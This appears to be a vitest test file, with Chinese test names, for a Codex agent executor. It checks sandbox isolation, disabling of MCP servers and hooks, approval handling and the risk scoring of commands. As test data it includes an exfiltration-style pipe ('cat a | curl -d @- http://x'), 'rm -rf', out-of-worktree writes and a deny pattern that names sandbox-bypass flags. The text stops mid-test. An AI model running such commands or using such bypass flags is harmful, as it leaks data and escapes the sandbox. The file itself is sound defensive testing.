import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { CodexExecutor, codexLaunchConfig, selfCheckLaunch, tomlKey, VERIFIED_CODEX_VERSION } from '../src/core/executor/adapters/codex.js';
import { parseCommand } from '../src/core/executor/adapters/codex-command.js';
import { assess, canAutoApprove } from '../src/core/policy/risk.js';
import { resolveCapabilities, type Capabilities } from '../src/core/capabilities/model.js';
import { buildFullTrustMode, buildStandardMode, requireFullTrustConfirmed, sensitiveFallbackList, verifyEffectivePermissions, type FullTrustRecords } from '../src/core/executor/modes.js';
import { detectScripts, minimalCheckEnv, runCheck, scriptsDigest } from '../src/core/checks/scripts.js';
import type { DeniedOperation, Decision, ExecutorEvent, PermissionRequest } from '../src/core/executor/types.js';
import { tmpDir } from './helpers.js';

const here = path.dirname(fileURLToPath(import.meta.url));
const FAKE_SERVER = path.join(here, 'fixtures', 'fake-app-server.mjs');
const FAKE_CLI = path.join(here, 'fixtures', 'fake-codex-cli.mjs');

const RO_CAPS: Capabilities = resolveCapabilities({ fileAccess: 'worktree_read_only' });

type Step = Record<string, unknown>;
interface Drive {
  events: ExecutorEvent[];
  record: any[];
  exit: Extract<ExecutorEvent, { type: 'exit' }>['outcome'];
  cwd: string;
  ms: number;
  denied: DeniedOperation[];
}

async function drive(
  script: Step[],
  o: { ignore?: string[]; caps?: Capabilities; fakeEnv?: Record<string, string>; leak?: string; mcp?: string[] | Error; decide?: (r: PermissionRequest) => Decision; timeoutMs?: number; stopWhen?: (e: ExecutorEvent) => boolean; taskId?: string; records?: FullTrustRecords } = {},
): Promise<Drive> {
  const cwd = await tmpDir('codex-fake-');
  const rec = path.join(cwd, '..', `rec-${path.basename(cwd)}.jsonl`);
  const ex = new CodexExecutor({
    command: process.execPath,
    prefixArgs: [FAKE_SERVER],
    env: { FAKE_APP_SCRIPT: JSON.stringify(script), FAKE_RECORD: rec, FAKE_MCP_CONFIGURED: JSON.stringify(o.mcp instanceof Error ? [] : (o.mcp ?? ['context7', 'my server'])), FAKE_IGNORE: (o.ignore ?? []).join(','), ...(o.leak ? { FAKE_MCP_LEAK: o.leak } : {}), ...(o.fakeEnv ?? {}) },
    mcpSettleMs: 100,
    discoverMcpServers: async () => {
      if (o.mcp instanceof Error) throw o.mcp;
      return o.mcp ?? ['context7', 'my server'];
    },
    interruptGraceMs: 400,
    killGraceMs: 300,
  });
  // 施工模式（标准 / 完全信任）下没有审批流程；需要测试“权限询问—决定”这条通用流程的用例（传了 decide）改用只读启动（思考层使用的启动方式，仍保留询问）。
  const caps = o.caps ?? (o.decide ? RO_CAPS : undefined);
  const run = ex.start({ cwd, prompt: '做点事', ...(o.timeoutMs ? { timeoutMs: o.timeoutMs } : {}), ...(caps ? { capabilities: caps } : {}), ...(o.taskId ? { taskId: o.taskId } : {}), ...(o.records ? { fullTrustRecords: o.records } : {}) });
  const events: ExecutorEvent[] = [];
  const t0 = Date.now();
  let stopped = false;
  for await (const e of run.events) {
    events.push(e);
    if (e.type === 'permission_request' && o.decide) await run.respond(e.request.id, o.decide(e.request));
    if (o.stopWhen?.(e) && !stopped) {
      stopped = true;
      void run.stop();
    }
  }
  const exitEv = events.at(-1);
  if (exitEv?.type !== 'exit') throw new Error('事件流没有以 exit 结束');
  const record = fs.existsSync(rec) ? fs.readFileSync(rec, 'utf8').trim().split('\n').filter(Boolean).map((l) => JSON.parse(l)) : [];
  return { events, record, exit: exitEv.outcome, cwd: fs.realpathSync(cwd), ms: Date.now() - t0, denied: exitEv.denied ?? [] };
}

const messages = (d: Drive) => d.events.filter((e): e is Extract<ExecutorEvent, { type: 'message' }> => e.type === 'message').map((e) => e.text);
const perms = (d: Drive) => d.events.filter((e): e is Extract<ExecutorEvent, { type: 'permission_request' }> => e.type === 'permission_request').map((e) => e.request);
const decisions = (d: Drive) => d.record.filter((r) => r.kind === 'decision').map((r) => r.result);

describe('Codex 适配器（假 app-server）', () => {
  it('正常完成：消息、工具调用、exited 0', async () => {
    const d = await drive([{ say: '开始' }, { cmd: { command: '/bin/zsh -lc "ls -la"' } }, { complete: { status: 'completed' } }]);
    expect(d.exit).toEqual({ kind: 'exited', code: 0 });
    expect(messages(d)).toContain('开始');
    expect(d.events).toContainEqual({ type: 'tool', name: 'run_command', summary: 'ls -la' });
  });

  it('回合失败：非零退出码并附原因，绝不报告为成功', async () => {
    const d = await drive([{ say: '试试' }, { complete: { status: 'failed', error: '模型不可用' } }]);
    expect(d.exit).toEqual({ kind: 'exited', code: 1 });
    expect(messages(d).join('\n')).toContain('模型不可用');
  });

  it('命令审批：允许 → accept', async () => {
    const d = await drive([{ askCommand: { command: '/bin/zsh -lc "npm run build"', cwd: '/x', reason: '要构建' } }], { decide: () => 'allow' });
    expect(perms(d)[0]).toMatchObject({ kind: 'run_command', command: ['npm', 'run', 'build'] });
    expect(decisions(d)).toEqual([{ decision: 'accept' }]);
    expect(d.exit).toEqual({ kind: 'exited', code: 0 });
  });

  it('命令审批：拒绝 → decline，并如实说明有操作被拒绝', async () => {
    const d = await drive([{ askCommand: { command: '/bin/zsh -lc "npm install"', cwd: '/x' } }], { decide: () => 'deny' });
    expect(decisions(d)).toEqual([{ decision: 'decline' }]);
    expect(messages(d).join('\n')).toMatch(/被拒绝.*npm install/s);
  });

  it('被拒绝的操作以结构化记录随 exit 事件给出（种类、命令/路径、风险）', async () => {
    const d = await drive(
      [{ askCommand: { command: '/bin/zsh -lc "npm install"', cwd: '/x' } }, { fileStart: { id: 'f9', changes: [{ path: 'a.txt', kind: 'update' }] } }, { askFile: { itemId: 'f9' } }],
      { decide: (r) => (r.kind === 'run_command' ? 'deny' : 'allow') },
    );
    expect(d.denied).toHaveLength(1);
    expect(d.denied[0]).toMatchObject({ kind: 'run_command', command: ['npm', 'install'] });
    expect(['low', 'medium', 'high']).toContain(d.denied[0]?.risk);
    const none = await drive([{ askCommand: { command: '/bin/zsh -lc "ls"', cwd: '/x' } }], { decide: () => 'allow' });
    expect(none.denied).toEqual([]);
  });

  it('文件修改审批：路径来自 fileChange 项；拒绝 → decline', async () => {
    const d = await drive(
      [{ fileStart: { id: 'f1', changes: [{ path: 'index.html', kind: 'update' }] } }, { askFile: { itemId: 'f1', reason: '改标题' } }],
      { decide: () => 'deny' },
    );
    expect(perms(d)[0]).toMatchObject({ kind: 'write_file', paths: ['index.html'] });
    expect(decisions(d)).toEqual([{ decision: 'decline' }]);
  });

  it('文件修改审批：只删除 → delete_file；不知道改哪些文件 → other（不会被当作低风险）', async () => {
    const del = await drive([{ fileStart: { id: 'f2', changes: [{ path: 'old.txt', kind: 'delete' }] } }, { askFile: { itemId: 'f2' } }], { decide: () => 'allow' });
    expect(perms(del)[0]).toMatchObject({ kind: 'delete_file', paths: ['old.txt'] });
    const unknown = await drive([{ askFile: { itemId: 'nope' } }], { decide: () => 'deny' });
    expect(perms(unknown)[0]?.kind).toBe('other');
  });

  it('越界写入审批：被评为高风险且不可恢复，不能自动批准', async () => {
    const wt = '/proj/.studio/worktrees/t1';
    for (const target of ['../outside.txt', '/tmp/leak.txt', path.join(os.tmpdir(), 'leak.txt'), '~/leak.txt', '$HOME/leak.txt']) {
      const d = await drive([{ askCommand: { command: `/bin/zsh -lc "printf hi > ${target}"`, cwd: '/proj/.studio/worktrees/t1' } }], { decide: () => 'deny' });
      const req = perms(d)[0]!;
      expect(req.paths, target).toContain(target);
      const a = assess(req, wt);
      expect(a, target).toMatchObject({ level: 'high', reversible: false });
      expect(canAutoApprove(a, { autoLow: true })).toBe(false);
    }
  });

  it('审批请求的工作目录在 worktree 之外也算越界', async () => {
    const d = await drive([{ askCommand: { command: '/bin/zsh -lc "ls"', cwd: '/somewhere/else' } }], { decide: () => 'deny' });
    expect(assess(perms(d)[0]!, '/proj/.studio/worktrees/t1')).toMatchObject({ level: 'high', reversible: false });
  });

  it('不支持的服务端请求被明确拒绝（JSON-RPC 错误），不会卡住', async () => {
    const d = await drive([{ askOther: { method: 'item/permissions/requestApproval' } }]);
    expect(decisions(d)[0]).toHaveProperty('error');
    expect(d.exit).toEqual({ kind: 'exited', code: 0 });
  });

  it('中断：先发 turn/interrupt，回合以 interrupted 结束 → stopped', async () => {
    const d = await drive([{ say: '工作中' }, { hang: {} }], { stopWhen: (e) => e.type === 'message' && e.text === '工作中' });
    expect(d.exit).toEqual({ kind: 'stopped' });
    expect(d.record.some((r) => r.kind === 'recv' && r.msg.method === 'turn/interrupt')).toBe(true);
  });

  it('中断被忽略时：宽限期后终止进程，仍然 stopped', async () => {
    const d = await drive([{ say: '工作中' }, { hang: { ignoreInterrupt: true } }], { stopWhen: (e) => e.type === 'message' && e.text === '工作中' });
    expect(d.exit).toEqual({ kind: 'stopped' });
    expect(d.ms).toBeLessThan(5000);
  });

  it('进程崩溃：如实映射为非零退出，不是成功', async () => {
    const d = await drive([{ say: '开始' }, { crash: 3 }]);
    expect(d.exit).toEqual({ kind: 'exited', code: 3 });
    expect(messages(d).join('\n')).toContain('退出');
  });

  it('进程在回合结束前以 0 退出：也不是成功', async () => {
    const d = await drive([{ crash: 0 }]);
    expect(d.exit).toEqual({ kind: 'exited', code: 1 });
  });

  it('超时 → timed_out', async () => {
    const d = await drive([{ hang: {} }], { timeoutMs: 300 });
    expect(d.exit).toEqual({ kind: 'timed_out' });
  });

  it('启动不了：spawn_error', async () => {
    const ex = new CodexExecutor({ command: '/no/such/codex-binary' });
    const run = ex.start({ cwd: os.tmpdir(), prompt: 'x' });
    const events: ExecutorEvent[] = [];
    for await (const e of run.events) events.push(e);
    expect(events.at(-1)).toMatchObject({ type: 'exit', outcome: { kind: 'spawn_error' } });
  });
});

describe('Codex 适配器：配置隔离与沙箱参数', () => {
  // 标准模式的启动参数与请求里不得出现：完全信任沙箱、跳过权限类参数、旧式沙箱配置键与回合沙箱、“以后都允许”类决定
  const FORBIDDEN = /danger-full-access|dangerFullAccess|dangerously|--yolo|bypass|full-auto|--trust\b|sandbox_mode|sandboxPolicy|acceptWithExecpolicyAmendment/i;

  it('codexLaunchConfig（标准模式）：权限配置档；仅副本可写、/tmp 与 $TMPDIR 只读、读取拒绝清单、不联网、审批 never；不再传旧式沙箱参数', () => {
    const cfg = codexLaunchConfig('/work/tree', { model: 'm1' });
    expect(cfg.args.slice(0, 5)).toEqual(['app-server', '--listen', 'stdio://', '-c', 'default_permissions="studio_standard"']);
    expect(cfg.args[5]).toBe('-c');
    const profile = cfg.args[6]!;
    expect(profile).toMatch(/^permissions\.studio_standard=\{extends=":workspace", filesystem=\{/);
    expect(profile).toContain('":slash_tmp"="read"');
    expect(profile).toContain('":tmpdir"="read"');
    expect(profile).toContain('"/work/tree"="write"');
    for (const d of sensitiveFallbackList()) expect(profile).toContain(`"${d}"="deny"`);
    expect(profile).not.toMatch(/network=/); // 默认不联网
    expect(cfg.args).not.toContain('features.network_proxy=true');
    expect(cfg.args.slice(7)).toEqual([
      '-c', 'instructions=""',
      '-c', 'developer_instructions=""',
      '-c', 'include_apps_instructions=false',
      '-c', 'notify=[]',
      '--disable', 'hooks',
      '--disable', 'memories',
      '-c', 'memories.use_memories=false',
      '-c', 'memories.generate_memories=false',
      '--disable', 'multi_agent',
      '--disable', 'remote_plugin',
      '--disable', 'shell_snapshot',
      '-c', 'allow_login_shell=false',
      '-c', 'shell_environment_policy.inherit="core"',
      '-c', 'web_search="disabled"',
      '--disable', 'plugins',
      '--disable', 'apps',
    ]);
    expect(cfg.threadStart).toEqual({ cwd: '/work/tree', approvalPolicy: 'never', ephemeral: true, model: 'm1' });
    expect(cfg.turnOverrides).toEqual({ cwd: '/work/tree', approvalPolicy: 'never' });
    expect(JSON.stringify(cfg)).not.toMatch(FORBIDDEN);
    expect(cfg.expected).toMatchObject({ mode: 'standard', approvalPolicy: 'never', profileId: 'studio_standard', networkEnabled: false });
  });

  it('用户配置的 MCP 服务器被逐个关闭；自定义指令被清空；连接器被禁用', async () => {
    expect(codexLaunchConfig('/w', { mcpServers: ['context7', 'my server'] }).args).toEqual(
      expect.arrayContaining(['-c', 'mcp_servers.context7.enabled=false', '-c', 'mcp_servers."my server".enabled=false']),
    );
    expect(tomlKey('a-b_1')).toBe('a-b_1');
    expect(tomlKey('we"ird')).toBe('"we\\"ird"');
    const d = await drive([{ complete: { status: 'completed' } }], { mcp: ['context7', 'my server'] });
    const argv = d.record.find((r) => r.kind === 'argv')!.argv as string[];
    expect(argv).toEqual(
      expect.arrayContaining(['mcp_servers.context7.enabled=false', 'mcp_servers."my server".enabled=false', 'instructions=""', 'developer_instructions=""', '--disable', 'apps']),
    );
  });

  it('查不出用户配置了哪些 MCP 服务器 → 不启动 Codex（宁可失败，不破坏隔离）', async () => {
    const d = await drive([{ complete: { status: 'completed' } }], { mcp: new Error('boom') });
    expect(d.exit).toEqual({ kind: 'exited', code: 1 });
    expect(messages(d).join('\n')).toMatch(/无法确认用户配置的 MCP/);
    expect(d.record.some((r) => r.kind === 'argv')).toBe(false); // app-server 没被启动
  });

  it('在 MCP 查询尚未结束时收到停止：立即 stopped，之后不会启动 Codex', async () => {
    const cwd = await tmpDir('codex-fake-');
    const rec = path.join(cwd, 'rec.jsonl');
    let release!: () => void;
    const gate = new Promise<void>((r) => (release = r));
    const ex = new CodexExecutor({
      command: process.execPath,
      prefixArgs: [FAKE_SERVER],
      env: { FAKE_APP_SCRIPT: '[]', FAKE_RECORD: rec },
      discoverMcpServers: async () => {
        await gate;
        return [];
      },
    });
    const run = ex.start({ cwd, prompt: 'x' });
    await run.stop();
    release();
    const events: ExecutorEvent[] = [];
    for await (const e of run.events) events.push(e);
    expect(events.at(-1)).toMatchObject({ type: 'exit', outcome: { kind: 'stopped' } });
    await new Promise((r) => setTimeout(r, 100));
    expect(fs.existsSync(rec)).toBe(false); // app-server 从未被启动
  });

  it('令牌刷新请求被明确拒绝（我们不接触凭证），且不会卡住', async () => {
    const d = await drive([{ askOther: { method: 'account/chatgptAuthTokens/refresh' } }]);
    expect(decisions(d)[0]).toHaveProperty('error');
    expect(JSON.stringify(decisions(d)[0])).toMatch(/credentials/);
    expect(d.exit).toEqual({ kind: 'exited', code: 0 });
  });

  it('真实发给 app-server 的启动参数与请求中包含隔离设置，且不含任何禁止参数', async () => {
    const d = await drive([{ complete: { status: 'completed' } }]);
    const argv = d.record.find((r) => r.kind === 'argv')!.argv as string[];
    expect(argv).toEqual(expect.arrayContaining(['app-server', '-c', 'default_permissions="studio_standard"', '--disable', 'plugins']));
    expect(argv.some((a) => a.startsWith('permissions.studio_standard='))).toBe(true);
    const msg = (m: string) => d.record.find((r) => r.kind === 'recv' && r.msg.method === m)!.msg.params;
    expect(msg('thread/start')).toMatchObject({ cwd: d.cwd, approvalPolicy: 'never', ephemeral: true });
    expect(msg('thread/start')).not.toHaveProperty('sandbox');
    expect(msg('turn/start')).toMatchObject({ cwd: d.cwd, approvalPolicy: 'never' });
    expect(msg('turn/start')).not.toHaveProperty('sandboxPolicy');
    expect(JSON.stringify([argv, d.record.filter((r) => r.kind === 'recv').map((r) => r.msg.params)])).not.toMatch(FORBIDDEN);
  });

  it('能力声明：支持权限询问；不支持停止后继续', () => {
    expect(new CodexExecutor().capabilities).toEqual({ permissionPrompts: true, resumeAfterStop: false });
  });
});

describe('Codex 适配器：能力映射与启动门禁', () => {
  const caps = (o: Partial<Capabilities> = {}): Capabilities => resolveCapabilities(o);
  const recv = (d: Drive, m: string) => d.record.find((r) => r.kind === 'recv' && r.msg.method === m);

  it('能力 → 参数：标准模式=权限配置档 + never；只读（思考层）=旧式只读 + untrusted；开网络 / 域名限制 / 额外可写目录', () => {
    const std = codexLaunchConfig('/w', { capabilities: caps() });
    expect(std.threadStart).toMatchObject({ approvalPolicy: 'never' });
    expect(std.args).toContain('default_permissions="studio_standard"');
    const ro = codexLaunchConfig('/w', { capabilities: caps({ fileAccess: 'worktree_read_only' }) });
    expect(ro.args).toContain('sandbox_mode="read-only"');
    expect(ro.args.some((a) => a.startsWith('default_permissions='))).toBe(false); // 两种写法不并用
    expect(ro.threadStart).toMatchObject({ approvalPolicy: 'untrusted', sandbox: 'read-only' });
    expect(ro.turnOverrides).toMatchObject({ sandboxPolicy: { type: 'readOnly' } });
    const net = codexLaunchConfig('/w', { capabilities: caps({ externalNetwork: 'on' }) });
    expect(net.args.find((a) => a.startsWith('permissions.'))).toMatch(/network=\{enabled=true\}\}$/);
    expect(net.args).toContain('web_search="live"');
    expect(net.args).not.toContain('features.network_proxy=true'); // 不限域名：不需要网络代理
    const dom = codexLaunchConfig('/w', { capabilities: caps({ externalNetwork: 'on', allowedNetworkDomains: ['example.com'] }) });
    expect(dom.args.find((a) => a.startsWith('permissions.'))).toContain('network={enabled=true, domains={"example.com"="allow"}}');
    expect(dom.args).toContain('features.network_proxy=true');
    expect(codexLaunchConfig('/w').args).toContain('web_search="disabled"');
    const extra = codexLaunchConfig('/w', { capabilities: caps({ extraWritableDirs: ['/data/out'] }) });
    expect(extra.args.find((a) => a.startsWith('permissions.'))).toContain('"/data/out"="write"');
  });

  it('标准模式的权限配置档：相对路径、路径含引号都被正确处理；非绝对路径被拒绝', () => {
    expect(() => buildStandardMode({ cwd: 'relative' })).toThrow(/绝对路径/);
    expect(() => buildStandardMode({ cwd: '/w', extraWritable: ['x'] })).toThrow(/绝对路径/);
    const m = buildStandardMode({ cwd: '/w "q"', denyRead: ['/d\\x'] });
    expect(m.args[3]).toContain('"/w \\"q\\""="write"');
    expect(m.args[3]).toContain('"/d\\\\x"="deny"');
  });

  it('启动前自检：构造出来的参数通过；任何一项被拿掉都会被发现', () => {
    const c = caps();
    const ok = codexLaunchConfig('/w', { mcpServers: ['m1'], capabilities: c });
    expect(selfCheckLaunch(ok, c, ['m1'])).toEqual([]);
    const without = (pred: (a: string[], i: number) => boolean) => ({ ...ok, args: ok.args.filter((_, i) => !pred(ok.args, i)) });
    expect(selfCheckLaunch(without((a, i) => a[i] === 'hooks' || a[i + 1] === 'hooks'), c, ['m1']).join()).toMatch(/hooks/);
    expect(selfCheckLaunch(without((a, i) => a[i] === 'notify=[]' || a[i + 1] === 'notify=[]'), c, ['m1']).join()).toMatch(/notify/);
    expect(selfCheckLaunch(without((a, i) => /mcp_servers\.m1/.test(a[i] ?? '') || /mcp_servers\.m1/.test(a[i + 1] ?? '')), c, ['m1']).join()).toMatch(/MCP「m1」/);
    expect(selfCheckLaunch(without((a, i) => /^default_permissions=/.test(a[i] ?? '') || /^default_permissions=/.test(a[i + 1] ?? '')), c, ['m1']).join()).toMatch(/权限配置档/);
    expect(selfCheckLaunch({ ...ok, threadStart: { ...ok.threadStart, approvalPolicy: 'on-request' } }, c, ['m1']).join()).toMatch(/审批/);
    // 回头加上旧式沙箱参数：既不能并用，标准模式也不得再传
    expect(selfCheckLaunch({ ...ok, args: [...ok.args, '-c', 'sandbox_mode="workspace-write"'] }, c, ['m1']).join()).toMatch(/不能并用/);
    expect(selfCheckLaunch({ ...ok, threadStart: { ...ok.threadStart, sandbox: 'workspace-write' } }, c, ['m1']).join()).toMatch(/旧式 sandbox/);
    // 可写根只能是副本与额外目录：偷偷多放一个可写路径会被发现
    const sneaky = ok.args.map((a) => (a.startsWith('permissions.') ? a.replace('filesystem={', 'filesystem={"/etc"="write", ') : a));
    expect(selfCheckLaunch({ ...ok, args: sneaky }, c, ['m1']).join()).toMatch(/可写根.*\/etc/);
    // 网络开关与能力不一致
    expect(selfCheckLaunch(ok, caps({ externalNetwork: 'on' }), ['m1']).join()).toMatch(/网络/);
  });

  it('正常情况：核验通过 → 放行，开始回合，并报告实际生效的审批/权限配置档/模型/指令来源', async () => {
    const d = await drive([{ complete: { status: 'completed' } }]);
    expect(d.exit).toEqual({ kind: 'exited', code: 0 });
    expect(recv(d, 'turn/start')).toBeDefined();
    const iso = d.events.find((e) => e.type === 'isolation');
    expect(iso).toMatchObject({ info: { approvalPolicy: 'never', sandbox: 'workspaceWrite', model: 'fake-model', grantedMcp: [], permissions: { mode: 'standard', profileId: 'studio_standard', approvalPolicy: 'never', networkEnabled: false, networkAccess: false } } });
    expect(JSON.stringify(iso)).toMatch(/AGENTS\.md/);
  });

  it('生效权限核验函数：期望与响应逐项比对', () => {
    const exp = codexLaunchConfig('/w').expected;
    const good = { approvalPolicy: 'never', activePermissionProfile: { id: 'studio_standard', extends: ':workspace' }, sandbox: { type: 'workspaceWrite', networkAccess: false } };
    expect(verifyEffectivePermissions(exp, good)).toEqual([]);
    expect(verifyEffectivePermissions(exp, { ...good, approvalPolicy: 'on-request' }).join()).toMatch(/审批/);
    expect(verifyEffectivePermissions(exp, { ...good, activePermissionProfile: { id: 'x', extends: ':workspace' } }).join()).toMatch(/权限配置档/);
    expect(verifyEffectivePermissions(exp, { ...good, activePermissionProfile: undefined }).join()).toMatch(/权限配置档/);
    expect(verifyEffectivePermissions(exp, { ...good, sandbox: { type: 'workspaceWrite', networkAccess: true } }).join()).toMatch(/网络/);
    expect(verifyEffectivePermissions(exp, { ...good, sandbox: { type: 'dangerFullAccess' } }).join()).toMatch(/放开/);
  });

  it.each([
    ['approval', /命令审批策略/],
    ['profile', /权限配置档/],
    ['sandbox', /沙箱被放开/],
    ['network', /外部网络未关闭/],
    ['notify', /notify 未关闭/],
    ['hooks', /hooks 未关闭/],
    ['memories', /memories 未关闭/],
    ['login_shell', /登录 shell 未关闭/],
    ['mcp', /MCP「context7」未关闭/],
    ['hooks_list', /仍有 1 个 hook 生效/],
  ])('启动后核验：%s 实际未生效 → 不开始回合，任务失败并报告“隔离无法确认”', async (key, re) => {
    const d = await drive([{ complete: { status: 'completed' } }], { ignore: [key] });
    expect(d.exit).toEqual({ kind: 'exited', code: 1 });
    const msg = messages(d).join('\n');
    expect(msg).toMatch(/隔离无法确认/);
    expect(msg).toMatch(re);
    expect(recv(d, 'turn/start')).toBeUndefined();
  });

  it('启动后核验：读不到实际生效的配置 → 视为无法确认，不开始回合', async () => {
    const d = await drive([{ complete: { status: 'completed' } }], { fakeEnv: { FAKE_CONFIG_ERROR: '1' } });
    expect(d.exit).toEqual({ kind: 'exited', code: 1 });
    expect(messages(d).join('\n')).toMatch(/隔离无法确认.*无法读取实际生效的配置/s);
    expect(recv(d, 'turn/start')).toBeUndefined();
  });

  it('模型服务地址核验：官方默认放行；非官方地址默认拒绝开始，并如实报告（只含地址的源，不含路径/密钥）', async () => {
    const ok = await drive([{ complete: { status: 'completed' } }]);
    expect(ok.events.find((e) => e.type === 'isolation')).toMatchObject({ info: { modelProvider: 'openai', warnings: [] } });

    const custom = { FAKE_MODEL_PROVIDER: 'acme', FAKE_PROVIDER_BASE: 'https://user:pw@llm.example.com:8443/v1/secret-path?key=1' };
    const d = await drive([{ complete: { status: 'completed' } }], { fakeEnv: custom });
    expect(d.exit).toEqual({ kind: 'exited', code: 1 });
    const msg = messages(d).join('\n');
    expect(msg).toMatch(/隔离无法确认.*数据将发往非官方地址：提供方「acme」（https:\/\/llm\.example\.com:8443）/s);
    expect(msg).not.toMatch(/secret-path|user:pw|SHOULD_NEVER_BE_READ|key=1/);
    expect(recv(d, 'turn/start')).toBeUndefined();

    const url = await drive([{ complete: { status: 'completed' } }], { fakeEnv: { FAKE_OPENAI_BASE_URL: 'https://proxy.example.net/v1' } });
    expect(messages(url).join('\n')).toMatch(/openai_base_url=https:\/\/proxy\.example\.net/);
    expect(url.exit).toEqual({ kind: 'exited', code: 1 });
  });

  it('模型服务地址：任务能力显式允许时放行，但 isolation 事件带“数据将发往非官方地址”警告', async () => {
    const d = await drive([{ complete: { status: 'completed' } }], { caps: caps({ nonOfficialModelEndpoint: 'allow' }), fakeEnv: { FAKE_MODEL_PROVIDER: 'acme', FAKE_PROVIDER_BASE: 'https://llm.example.com/v1' } });
    expect(d.exit).toEqual({ kind: 'exited', code: 0 });
    const iso = d.events.find((e) => e.type === 'isolation') as Extract<ExecutorEvent, { type: 'isolation' }>;
    expect(iso.info.warnings).toEqual(['数据将发往非官方地址：提供方「acme」（https://llm.example.com）']);
  });

  it('授予的 MCP 不关闭、且不算违规；未授予的仍被关闭', async () => {
    const d = await drive([{ complete: { status: 'completed' } }], { caps: caps({ grantedMcp: ['context7'] }), leak: 'context7' });
    expect(d.exit).toEqual({ kind: 'exited', code: 0 });
    const argv = d.record.find((r) => r.kind === 'argv')!.argv as string[];
    expect(argv).not.toContain('mcp_servers.context7.enabled=false');
    expect(argv).toContain('mcp_servers."my server".enabled=false');
    const bad = await drive([{ complete: { status: 'completed' } }], { caps: caps({ grantedMcp: ['context7'] }), leak: 'my server' });
    expect(messages(bad).join('\n')).toMatch(/隔离失败.*my server/s);
  });

  it('授予的 MCP 不在用户配置里 → 启动前就拒绝（app-server 未启动）', async () => {
    const d = await drive([{ complete: { status: 'completed' } }], { caps: caps({ grantedMcp: ['nope'] }) });
    expect(d.exit).toEqual({ kind: 'exited', code: 1 });
    expect(messages(d).join('\n')).toMatch(/隔离无法确认.*授予的 MCP「nope」不在用户配置中/s);
    expect(d.record.some((r) => r.kind === 'argv')).toBe(false);
  });
});

describe('Codex 适配器：detect()', () => {
  const ex = (login: string, command = process.execPath) =>
    new CodexExecutor({ command, prefixArgs: command === process.execPath ? [FAKE_CLI] : [], env: { FAKE_LOGIN: login } });
  it('已安装且已登录', async () => {
    expect(await ex('yes').detect()).toMatchObject({ installed: true, loggedIn: 'yes', version: 'codex-cli 9.9.9' });
  });
  it('版本与经过验证的版本不同 → 提示“未经验证”，但不阻止使用', async () => {
    const r = await ex('yes').detect(); // 假 CLI 报告 9.9.9
    expect(r).toMatchObject({ installed: true, verified: false });
    expect(r.note).toMatch(new RegExp(`未经验证.*${VERIFIED_CODEX_VERSION}`));
    expect(VERIFIED_CODEX_VERSION).toBe('0.166.0');
  });
  it('提示无法关闭的用户级扩展：只报告是否存在（AGENTS.md、skills），不读取内容', async () => {
    const home = await tmpDir('codex-home-');
    const make = () => new CodexExecutor({ command: process.execPath, prefixArgs: [FAKE_CLI], env: { FAKE_LOGIN: 'yes', CODEX_HOME: home } });
    expect((await make().detect()).isolationNotes).toBeUndefined();
    fs.writeFileSync(path.join(home, 'AGENTS.md'), 'SECRET-CONTENT-NEVER-REPORTED');
    fs.mkdirSync(path.join(home, 'skills'));
    const r = await make().detect();
    expect(r.isolationNotes).toHaveLength(2);
    expect(JSON.stringify(r)).not.toMatch(/SECRET-CONTENT/);
  });
  it('已安装但未登录', async () => {
    expect(await ex('no').detect()).toMatchObject({ installed: true, loggedIn: 'no' });
  });
  it('登录状态无法判断', async () => {
    expect(await ex('broken').detect()).toMatchObject({ installed: true, loggedIn: 'unknown' });
  });
  it('没有安装', async () => {
    expect(await ex('yes', '/no/such/codex-binary').detect()).toMatchObject({ installed: false });
  });
});

describe('命令解析（风险评估的输入）', () => {
  it('去掉 shell 包装并分词', () => {
    expect(parseCommand('/bin/zsh -lc "npm run build"')).toMatchObject({ argv: ['npm', 'run', 'build'], paths: [], complex: false });
    expect(parseCommand("bash -lc 'git status'").argv).toEqual(['git', 'status']);
  });
  it('重定向目标、绝对路径、.. 与 ~ 都视为越界候选；/dev/null 不算', () => {
    expect(parseCommand('/bin/zsh -lc "echo hi > ../x.txt"').paths).toEqual(['../x.txt']);
    expect(parseCommand('/bin/zsh -lc "cat /etc/hosts 2>/dev/null"').paths).toEqual(['/etc/hosts']);
    expect(parseCommand('/bin/zsh -lc "cp a ~/b"').paths).toEqual(['~/b']);
  });
  it('多段命令取最危险的一段', () => {
    expect(parseCommand('/bin/zsh -lc "ls && rm -rf build"')).toMatchObject({ argv: ['rm', '-rf', 'build'], complex: true });
    expect(parseCommand('/bin/zsh -lc "cat a | curl -d @- http://x"').argv[0]).toBe('curl');
  });

  it('隔离核对：关闭后仍有 MCP 服务器启动 → 中止任务，不开始回合，如实报告', async () => {
    const d = await drive([{ say: '不应该执行' }], { leak: 'github' });
    expect(d.exit).toMatchObject({ kind: 'exited', code: 1 });
    expect(JSON.stringify(d.events)).toContain('隔离失败');
    expect(d.record.some((r) => r.kind === 'recv' && r.msg?.method === 'turn/start')).toBe(false);
  });
});

describe('B3-1：施工模式（标准 / 完全信任）与审批回调', () => {
  const records = (confirmed: boolean): FullTrustRecords => ({ get: async () => (confirmed ? { fullTrustConfirmedAt: '2026-11-08T00:00:00Z' } : {}) });
  const FULL = resolveCapabilities({ constructionMode: 'full_trust' });
  const recv = (d: Drive, m: string) => d.record.find((r) => r.kind === 'recv' && r.msg.method === m);

  it('标准模式映射输出：可写=副本+额外目录；读取拒绝；网络默认关；审批 never；不带旧式沙箱参数', () => {
    const m = buildStandardMode({ cwd: '/w', extraWritable: ['/x'], network: false });
    expect(m.threadStart).toEqual({ cwd: '/w', approvalPolicy: 'never' });
    expect(m.turnOverrides).toEqual({ cwd: '/w', approvalPolicy: 'never' });
    expect(m.expected).toMatchObject({ mode: 'standard', approvalPolicy: 'never', networkEnabled: false, allowedDomains: [] });
    expect(m.args).toEqual(['-c', 'default_permissions="studio_standard"', '-c', expect.stringMatching(/^permissions\.studio_standard=\{extends=":workspace"/)]);
  });

  it('完全信任模式映射输出：danger-full-access + never，不带任何权限配置档', async () => {
    const m = await buildFullTrustMode('t1', '/w', records(true));
    expect(m).toMatchObject({ mode: 'full_trust', args: [], threadStart: { approvalPolicy: 'never', sandbox: 'danger-full-access' }, turnOverrides: { approvalPolicy: 'never', sandboxPolicy: { type: 'dangerFullAccess' } } });
  });

  it('完全信任门禁：任务记录里没有确认标记（或任务不存在）→ 抛错；有确认 → 通过', async () => {
    await expect(requireFullTrustConfirmed('t1', records(false))).rejects.toThrow(/尚未确认完全信任/);
    await expect(requireFullTrustConfirmed('t1', { get: async () => null })).rejects.toThrow(/尚未确认/);
